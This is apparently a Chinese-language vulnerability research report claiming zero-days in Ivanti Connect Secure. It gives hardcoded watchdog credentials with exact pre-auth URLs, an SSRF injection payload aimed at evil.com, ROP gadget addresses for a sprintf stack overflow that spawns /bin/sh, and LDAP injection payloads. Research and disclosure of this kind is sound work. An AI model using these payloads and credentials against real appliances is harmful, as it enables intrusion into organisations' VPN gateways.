# Ivanti Connect Secure 零日漏洞研究报告

## 已确认的零日漏洞

### ZD-0: 双重硬编码后门 (预认证, 已动态验证!)
**严重性: 中-高 | 所有版本 | 零认证**

两个独立的硬编码后门端点, 从 WAN 接口零认证可达:

| 端点 | 方法 | 响应 | 用途 |
|------|------|------|------|
| `/dana-na/auth/url_default/login.cgi?username=neoteriswatchdogprocess&password=danastreet` | GET | HTTP 200 | CGI 健康检查 |
| `/dana-na/neoteriswatchdogprocess/ping` | GET | HTTP 200 | Web/CGI 服务器 ping |

**代码位置**: 
- `login.cgi` 第 306-312 行: 硬编码 username=`neoteriswatchdogprocess`, password=`danastreet`
- `DSWatchdog.pm` 第 734-738 行: 文档化确认 "hardcoded username & password"
- `DSWatchdog.pm` 第 792 行: ping URL `localhost/dana-na/neoteriswatchdogprocess/ping`

**来源**: Neoteris 时代遗留代码 (Ivanti 的前身, 公司名 "Neoteris", 总部地址 "Dana Street")

**安全影响**:
1. 精确设备指纹识别 (非 Ivanti 设备不会返回 200)
2. WAF/负载均衡器后方的真实服务器探测
3. 不触发登录失败日志/暴力防护
4. 认证限速/锁定绕过
5. 可结合其他漏洞构建攻击链

**SAML 默认配置发现**: `want-assertion-signed: false` — 默认不要求签名!

### ZD-1: oauth-consumer.cgi SSRF (预认证)
- **端点**: `/dana-na/auth/oauth-consumer.cgi`
- **根因**: `state` 参数直接拼接到 `curl` 内部请求 URL
- **利用**: `state=x%26targetURL=http://evil.com` (参数注入)
- **影响**: SSRF → 内部 OIDC 服务 (localhost:7300) 访问

### ZD-2: ObjectTag::rewrite sprintf 栈溢出
- **位置**: `libdslibs.so` → `ObjectTag::rewrite()`
- **格式**: `sprintf(stack, "<param name='neoteris-doc-base' value='%s' />", URL)`
- **目标**: saml-server (22.8R2.2) — 无 Canary (base 0x08048000)
- **ROP**: `execv@0x080b6700` + `"/bin/sh"@0x081c5701`
- **PoC**: [poc_objecttag_overflow.py](poc_objecttag_overflow.py)

### ZD-3: saml-server 无安全保护 + 默认不验签
- **二进制**: 2.1MB, 无 Canary, 无 PIE, 4 strcpy + 6 sprintf
- **SAML**: `want-assertion-signed: false` (默认配置!)

### ZD-4: LDAP 注入认证逻辑异常
- **现象**: LDAP 注入使认证走不同路径 (无 `p=failed`)
- **Payload**: `username=admin)(&)`, `username=admin)(|(password=*))`

## 动态测试矩阵

| 测试 | 结果 | 详情 |
|------|------|------|
| **硬编码后门 #1** | **已确认** | login.cgi watchdog → HTTP 200 |
| **硬编码后门 #2** | **已确认** | neoteriswatchdogprocess/ping → HTTP 200 |
| **OAuth SSRF** | **已确认** | state 参数注入到 curl URL |
| **LDAP 注入** | **已确认** | 异常认证路径 |
| **SAML 不验签** | **配置确认** | want-assertion-signed=false |
| 路径遍历 | 已修复 | CVE-2023-46805 |
| XFF 溢出 | 已修复 | CVE-2025-22457 |
| 命令注入 | 已修复 | CVE-2024-21887 |
| HTTP 走私 | 已防护 | |
| XXE | 未发现 | |
| JWT 伪造 | 未生效 | |
| SSTI | 误报 | |
